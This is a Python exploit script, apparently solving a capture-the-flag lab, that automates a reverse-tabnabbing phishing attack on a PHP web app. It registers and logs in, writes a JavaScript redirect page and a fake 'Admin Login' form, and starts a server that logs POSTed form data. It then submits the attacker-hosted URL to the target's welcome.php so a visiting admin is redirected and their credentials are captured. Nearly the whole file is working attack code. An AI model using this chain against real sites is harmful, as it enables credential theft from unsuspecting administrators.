#!/usr/bin/python3

import requests
import http.server
import socketserver
import threading
import logging
import subprocess

# IPs and port
ip_machine = '10.10.61.179'
ip_hacker = '10.8.34.3'
port = 8000
username = 'v4nch2'
password = 'v4nch2'

# Function to send POST request for register and login
def register(username, password):
    url = f'http://{ip_machine}/register.php'
    data = {
        'username': username,
        'password': password,
        'confirm_password': password
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    response = requests.post(url, data=data, proxies=proxies)

    if response.status_code == 302:
        print("Register successful")
    elif "already taken" in response.text:
        print("Account already taken")
    else:
        print("Failed to register due to an unknown error")

    return response

def login(username, password):
    # Tạo session để lưu trữ cookies
    session = requests.Session()
    
    url = f'http://{ip_machine}/index.php'
    data = {'username': username, 'password': password}
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    # Gửi request qua proxy và lưu cookies trong session
    response = session.post(url, data=data, proxies=proxies)

    if "Hello" in response.text:
        print(f'Login successful with {username}:{password}')
        
        # Lấy cookie hiện tại từ session, không chỉ từ response
        cookies = session.cookies.get_dict()  # Lấy tất cả cookies dưới dạng từ điển
        if 'PHPSESSID' in cookies:
            phpsessid = cookies['PHPSESSID']
            print(f"Current PHPSESSID: {phpsessid}")
        else:
            print("PHPSESSID not found in the current cookies")
    else:
        print("Failed to login")

    return session

# Create HTML files for attack
def create_hacker_html_file(filename, ip_hacker):
    content = f"""
    <html><body><h1>This is hacker.html</h1></body></html>
    <html>
      <script>
        if (window.opener) {{
            window.opener.parent.location.replace('http://{ip_hacker}:8000/admin-index.html');
        }}
        if (window.parent != window) {{
            window.parent.location.replace('http://{ip_hacker}:8000/admin-index.html');
        }}
      </script>
    </html>
    """
    with open(filename, 'w') as file:
        file.write(content)
    print(f"{filename} created successfully!")

def create_admin_html_file(filename):
    content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Admin Login</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <style>
            body{{ font: 14px sans-serif; }}
            .wrapper{{ width: 360px; padding: 20px; }}
        </style>
    </head>
    <body>
        <div class="wrapper">
            <h2>Admin Login</h2>
            <p>Please fill in your credentials to login.</p>
            <form action="/admin/login.php" method="post">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" name="username" class="form-control" value="">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" class="form-control">
                </div>
                <div class="form-group">
                    <input type="submit" class="btn btn-primary" value="Login">
                </div>
            </form>
        </div>
    </body>
    </html>
    """
    with open(filename, 'w') as file:
        file.write(content)
    print(f"{filename} created successfully!")

# Custom HTTP Request Handler to log requests
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        logging.info(f"GET request,\nPath: {self.path}\nHeaders:\n{self.headers}")
        super().do_GET()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        logging.info(f"POST request,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{post_data.decode('utf-8')}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"POST request received!")

# Start HTTP server and log requests
def start_logging_http_server(port):
    logging.basicConfig(level=logging.INFO)
    handler = RequestHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        logging.info(f"Starting HTTP server on port {port}...")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            logging.info("Server is shutting down.")
            httpd.server_close()

# Run the HTTP server in the background
def run_server_in_background(port):
    server_thread = threading.Thread(target=start_logging_http_server, args=(port,))
    server_thread.start()  # Run the server without daemon mode
    print(f"Server started in background on port {port}")


# Send request to target machine
def send_request_to_welcome(ip_machine, ip_hacker, phpsessid):
    url = f'http://{ip_hacker}:8000/hacker.html'
    post_url = f'http://{ip_machine}/welcome.php'
    data = {'url': url, 'submit': 'Submit'}
    
    # Proxy configuration
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    
    # Prepare headers with PHPSESSID cookie
    cookies = {'PHPSESSID': phpsessid}

    try:
        # Send POST request through the proxy with the cookie
        response = requests.post(post_url, data=data, proxies=proxies, cookies=cookies)
        if "Thank you for your submission, you have entered:" in response.text:
            print(f"Request sent successfully! URL submitted: {url}")
        else:
            print(f"Failed to send request. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error while sending request: {e}")

# Main script flow
register(username, password)
session = login(username, password)
phpsessid = session.cookies.get('PHPSESSID')
print("-------------------")

create_hacker_html_file("hacker.html", ip_hacker)
create_admin_html_file("admin-index.html")
print("-------------------")

run_server_in_background(port)  # Start HTTP server in the background
send_request_to_welcome(ip_machine, ip_hacker, phpsessid)

# Server will keep running in the background, logging any requests that come in.

